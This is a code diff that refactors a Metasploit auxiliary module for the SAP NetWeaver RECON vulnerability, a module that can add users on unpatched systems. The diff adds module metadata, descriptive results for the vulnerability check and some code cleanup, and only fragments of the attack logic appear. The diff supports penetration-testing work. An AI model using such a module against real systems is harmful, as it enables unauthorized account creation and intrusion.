@@ -29,7 +29,10 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://us-cert.cisa.gov/ncas/alerts/aa20-195a' ]
         ],
         'Notes' => {
-          'AKA' => [ 'RECON' ]
+          'AKA' => [ 'RECON' ],
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],
+          'Reliability' => []
         },
         'Actions' => [
           [ 'ADD', { 'Description' => 'Add the specified user' } ],
@@ -60,14 +63,15 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    return Exploit::CheckCode::Safe unless res&.code == 200
-    return Exploit::CheckCode::Safe unless res.headers['Content-Type'].strip.start_with?('text/xml')
+    return Exploit::CheckCode::Unknown('No response received from target') if res.nil?
+    return Exploit::CheckCode::Safe('Unexpected HTTP status') unless res.code == 200
+    return Exploit::CheckCode::Safe('Response is not XML') unless res.headers['Content-Type'].to_s.strip.start_with?('text/xml')
 
     xml = res.get_xml_document
-    return Exploit::CheckCode::Safe unless xml.namespaces['xmlns:wsdl'] == 'http://schemas.xmlsoap.org/wsdl/'
-    return Exploit::CheckCode::Safe if xml.xpath("//wsdl:definitions/wsdl:service[@name='CTCWebService']").empty?
+    return Exploit::CheckCode::Safe('Response does not contain WSDL namespace') unless xml.namespaces['xmlns:wsdl'] == 'http://schemas.xmlsoap.org/wsdl/'
+    return Exploit::CheckCode::Safe('CTCWebService not found in WSDL') if xml.xpath("//wsdl:definitions/wsdl:service[@name='CTCWebService']").empty?
 
-    Exploit::CheckCode::Vulnerable
+    Exploit::CheckCode::Vulnerable('SAP NetWeaver CTCWebService WSDL endpoint is accessible')
   end
 
   def run
@@ -103,11 +107,9 @@ class MetasploitModule < Msf::Auxiliary
 
       event = job.get_event
 
-      unless (action_id = event.xpath('//ctc:StartAction/ctc:Action/ctc:ActionId/text()')).blank?
-        if action_id.to_s == 'genErrorNotification'
-          report_error_details(job)
-          fail_with(Failure::Unknown, 'General error')
-        end
+      if !(action_id = event.xpath('//ctc:StartAction/ctc:Action/ctc:ActionId/text()')).blank? && (action_id.to_s == 'genErrorNotification')
+        report_error_details(job)
+        fail_with(Failure::Unknown, 'General error')
       end
 
       unless (description = event.xpath('//ctc:StartAction/ctc:Action/ctc:Description/text()')).blank?
@@ -276,7 +278,7 @@ class WebServiceJob
     res.get_xml_document.xpath('//return/text()').to_s != 'false'
   end
 
-  def get_event # rubocop:disable Naming/AccessorMethodName
+  def get_event
     envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
